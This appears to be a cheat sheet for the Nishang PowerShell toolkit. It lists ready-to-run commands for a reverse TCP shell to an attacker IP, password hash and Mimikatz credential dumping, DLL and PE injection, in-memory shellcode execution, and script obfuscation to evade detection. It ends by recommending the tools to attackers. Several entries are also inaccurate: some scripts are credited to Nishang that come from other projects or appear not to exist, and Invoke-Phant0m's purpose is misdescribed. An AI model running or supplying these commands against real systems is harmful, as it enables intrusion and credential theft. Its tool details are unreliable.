Nishang is a collection of PowerShell scripts and modules designed for penetration testing and exploitation, primarily in Windows environments. It includes various scripts for tasks like payload generation, command execution, and data exfiltration.

### **Nishang Commands and Options**

1. **`Invoke-PowerShellTcp`** – PowerShell TCP Reverse Shell

   - **Description:** Creates a reverse TCP shell using PowerShell.
   - **Command:**
     ```powershell
     .\Invoke-PowerShellTcp.ps1 -Reverse -IPAddress <attacker_ip> -Port <attacker_port>
     ```
   - **Example:**
     ```powershell
     .\Invoke-PowerShellTcp.ps1 -Reverse -IPAddress 192.168.1.100 -Port 4444
     ```
   - **Explanation:** Connects back to the attacker's IP and port, providing a reverse shell.

2. **`Invoke-PowerDump`** – PowerShell Password Dumping

   - **Description:** Dumps password hashes from a Windows system.
   - **Command:**
     ```powershell
     .\Invoke-PowerDump.ps1 -All
     ```
   - **Example:**
     ```powershell
     .\Invoke-PowerDump.ps1 -All
     ```
   - **Explanation:** Retrieves all available password hashes from the system.

3. **`Invoke-Phant0m`** – Remote Command Execution via PowerShell

   - **Description:** Executes commands on a remote system using PowerShell.
   - **Command:**
     ```powershell
     .\Invoke-Phant0m.ps1 -Command "ipconfig"
     ```
   - **Example:**
     ```powershell
     .\Invoke-Phant0m.ps1 -Command "net user"
     ```
   - **Explanation:** Executes `ipconfig` or `net user` on the remote system.

4. **`Invoke-Obfuscation`** – PowerShell Script Obfuscation

   - **Description:** Obfuscates PowerShell scripts to evade detection.
   - **Command:**
     ```powershell
     .\Invoke-Obfuscation.ps1 -ScriptPath .\payload.ps1
     ```
   - **Example:**
     ```powershell
     .\Invoke-Obfuscation.ps1 -ScriptPath .\malicious.ps1
     ```
   - **Explanation:** Obfuscates the PowerShell script `malicious.ps1`.

5. **`Invoke-ReflectivePEInjection`** – Reflective PE Injection

   - **Description:** Injects a PE (Portable Executable) file into a target process.
   - **Command:**
     ```powershell
     .\Invoke-ReflectivePEInjection.ps1 -PEPath .\payload.exe -ProcessId <pid>
     ```
   - **Example:**
     ```powershell
     .\Invoke-ReflectivePEInjection.ps1 -PEPath .\payload.exe -ProcessId 1234
     ```
   - **Explanation:** Injects `payload.exe` into a process with ID `1234`.

6. **`Invoke-DLLInjection`** – DLL Injection

   - **Description:** Injects a DLL into a process.
   - **Command:**
     ```powershell
     .\Invoke-DLLInjection.ps1 -DLLPath .\payload.dll -ProcessId <pid>
     ```
   - **Example:**
     ```powershell
     .\Invoke-DLLInjection.ps1 -DLLPath .\payload.dll -ProcessId 5678
     ```
   - **Explanation:** Injects `payload.dll` into a process with ID `5678`.

7. **`Invoke-Mimikatz`** – Mimikatz Integration

   - **Description:** Uses Mimikatz to extract credentials and other sensitive information.
   - **Command:**
     ```powershell
     .\Invoke-Mimikatz.ps1 -Command 'privilege::debug'
     ```
   - **Example:**
     ```powershell
     .\Invoke-Mimikatz.ps1 -Command 'sekurlsa::logonpasswords'
     ```
   - **Explanation:** Extracts credentials and other sensitive information.

8. **`Invoke-GetUserSPNs`** – Retrieves User Service Principal Names (SPNs)

   - **Description:** Retrieves Service Principal Names (SPNs) from the target.
   - **Command:**
     ```powershell
     .\Invoke-GetUserSPNs.ps1 -Domain <domain>
     ```
   - **Example:**
     ```powershell
     .\Invoke-GetUserSPNs.ps1 -Domain example.com
     ```
   - **Explanation:** Retrieves SPNs from the specified domain.

9. **`Invoke-Shellcode`** – Shellcode Execution

   - **Description:** Executes shellcode in memory.
   - **Command:**
     ```powershell
     .\Invoke-Shellcode.ps1 -Shellcode <byte_array>
     ```
   - **Example:**
     ```powershell
     .\Invoke-Shellcode.ps1 -Shellcode [byte[]](0x90, 0x90, 0x90, 0x90)
     ```
   - **Explanation:** Executes shellcode in memory.

10. **`Invoke-CredentialDumping`** – Credential Dumping

    - **Description:** Dumps credentials from the target system.
    - **Command:**
      ```powershell
      .\Invoke-CredentialDumping.ps1 -All
      ```
    - **Example:**
      ```powershell
      .\Invoke-CredentialDumping.ps1 -Domain example.com
      ```
    - **Explanation:** Dumps credentials, including usernames and passwords.

### **Summary of Nishang Commands**

| **Script/Module**        | **Command Example**                                              | **Description**                                   |
|--------------------------|------------------------------------------------------------------|---------------------------------------------------|
| `Invoke-PowerShellTcp`   | `.\Invoke-PowerShellTcp.ps1 -Reverse -IPAddress 192.168.1.100 -Port 4444` | Creates a reverse TCP shell                      |
| `Invoke-PowerDump`       | `.\Invoke-PowerDump.ps1 -All`                                    | Dumps password hashes from the system            |
| `Invoke-Phant0m`         | `.\Invoke-Phant0m.ps1 -Command "ipconfig"`                        | Executes remote commands via PowerShell          |
| `Invoke-Obfuscation`     | `.\Invoke-Obfuscation.ps1 -ScriptPath .\payload.ps1`             | Obfuscates PowerShell scripts                     |
| `Invoke-ReflectivePEInjection` | `.\Invoke-ReflectivePEInjection.ps1 -PEPath .\payload.exe -ProcessId 1234` | Injects a PE file into a process                 |
| `Invoke-DLLInjection`    | `.\Invoke-DLLInjection.ps1 -DLLPath .\payload.dll -ProcessId 5678` | Injects a DLL into a process                     |
| `Invoke-Mimikatz`        | `.\Invoke-Mimikatz.ps1 -Command 'sekurlsa::logonpasswords'`       | Extracts credentials using Mimikatz              |
| `Invoke-GetUserSPNs`     | `.\Invoke-GetUserSPNs.ps1 -Domain example.com`                    | Retrieves SPNs from the specified domain         |
| `Invoke-Shellcode`       | `.\Invoke-Shellcode.ps1 -Shellcode [byte[]](0x90, 0x90, 0x90, 0x90)` | Executes shellcode in memory                     |
| `Invoke-CredentialDumping` | `.\Invoke-CredentialDumping.ps1 -All`                            | Dumps credentials from the target system         |

Nishang provides a wide range of PowerShell-based tools for various penetration testing and exploitation tasks, offering versatility and ease of use for attackers and security professionals.